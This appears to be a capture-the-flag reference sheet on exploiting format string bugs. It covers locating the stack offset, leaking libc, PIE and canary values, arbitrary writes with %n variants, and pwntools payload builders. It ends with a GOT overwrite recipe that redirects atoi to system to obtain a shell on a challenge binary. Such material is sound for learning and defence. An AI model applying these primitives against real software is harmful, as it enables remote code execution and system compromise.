# Format string bugs — leaks and arbitrary writes

Bug: user data reaches the *format* argument — `printf(buf)`, `sprintf(dst,
buf)`, `fprintf`, `syslog(buf)`. Probe every echo with `%p %p %p` and `%7$p`.

## 1. Find the format offset (stack slot of your buffer)

amd64: printf consumes arg1-arg5 from rsi,rdx,rcx,r8,r9; anything you can
reference positionally lives on the stack starting at `%6$`. i386: scan the
dump — the buffer usually lands within the first few slots.

```python
mark = cyclic(8)                        # recognizable qword
io.sendline(mark + b" %p" * 24)
for i, tok in enumerate(io.recvline().split()):
    if not tok.startswith(b"0x"):
        continue
    off = cyclic_find(int(tok, 16))
    if isinstance(off, int) and off >= 0:
        log.success("format offset: %d", i)   # token i pairs with %i$
        break
```

(Token 0 is your marker; tokens and conversions pair 1:1 after it, so token
index == positional index.)

## 2. Reading

| Specifier | Effect |
|---|---|
| `%N$p` / `%N$lx` | raw qword at positional slot N |
| `%N$s` | prints the bytes at the address held by slot N (char* deref) |
| `%N$hn` family | writes, section 3 |

Arbitrary read: place the target address in your input *after* the format
text (printf stops parsing at its NUL, the bytes stay on the stack) and
reference that slot positionally:

```python
payload = b"%13$s" + p64(elf.got["puts"])      # adjust 13 to your layout
```

Leaks that matter:
- **libc pointer**: `%N$s` on a GOT entry prints the 6 raw little-endian
  bytes stored there (the libc address) →
  `leak = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))`, then
  `libc.address = leak - libc.sym["puts"]`.
- **libc return address**: any stack slot holding a return into libc;
  subtract the offset for your handout libc.
- **PIE base**: saved return address into the binary minus known symbol
  offset.
- **canary**: slot holding `0x…00`-terminated value
  (`references/mitigations.md` section 3).
- **stack pointer**: any `0x7ff…` slot → write targets on the stack.

## 3. Writing

| Specifier | Writes | Size |
|---|---|---|
| `%n` | characters printed so far, as int | 4 bytes |
| `%hn` | as short | 2 bytes |
| `%hhn` | as char | 1 byte |

Manual: counts accumulate left to right; pad with `%<N>c` to reach a value.
A 6-byte libc pointer = four `%hhn` writes (per byte) or two `%hn` writes —
order writes so counts only increase; big deltas need huge padding.

### pwntools builders

```python
# one-shot payload
payload = fmtstr_payload(offset, {addr: value}, numbwritten=0, write_size="byte")
```

- `offset` — positional index of your buffer (section 1).
- `numbwritten` — bytes printf already printed before your format runs
  (prompt/echo text); wrong value shifts every write.
- `write_size` — `"byte"` (`%hhn`; safest, longest payload), `"short"`,
  `"int"`. Short input buffers may not fit 4 hhn writes per qword — switch to
  `"short"`.

```python
# FmtStr helper when the vulnerable printf is in a loop (one write per round)
def send_fmt(payload):
    io.sendlineafter(b"> ", payload)
    return io.recvline()

fmt = FmtStr(execute_fmt=send_fmt, offset=12)
fmt.write(elf.got["strlen"], libc.sym["system"])
fmt.execute_writes()
```

## 4. GOT overwrite workflow (Partial RELRO)

1. Leak libc (section 2) → `libc.address`.
2. Pick a GOT entry for a function later called with **your string as first
   argument**: `strlen`, `printf`, `puts`, `atoi`, `free` are the classics.
3. Overwrite it with `system` (`fmtstr_payload` / `FmtStr` above).
4. Send `/bin/sh` into that call → shell.

Full RELRO: GOT is read-only — instead write a *saved return address* (leak a
stack slot first, section 2) or pivot to heap targets
(`references/heap.md`).

## 5. Filters and fortify

- `%n` filtered by input validation → leaks (section 2) still work; find the
  write elsewhere (overflow, heap).
- FORTIFY builds route printf through `__printf_chk`, which aborts on `%n`
  when the format sits in writable memory (`references/mitigations.md`).
- glibc handles fully positional formats (`%1$n` before any bare conversion)
  fine.

## 6. Recipe (two-stage)

```python
from pwn import *
context.arch = "amd64"
elf, libc = ELF("./chal"), ELF("./libc.so.6")
io = process("./chal_patched")

# 1) offset from section 1                -> FMT_OFF
# 2) leak libc (GOT %s or retaddr %p)     -> libc.address
# 3) leak PIE slot if needed              -> elf.address
# 4) write + trigger
payload = fmtstr_payload(FMT_OFF, {elf.got["atoi"]: libc.sym["system"]})
io.sendlineafter(b"> ", payload)
io.sendlineafter(b"> ", b"/bin/sh")
io.interactive()
```
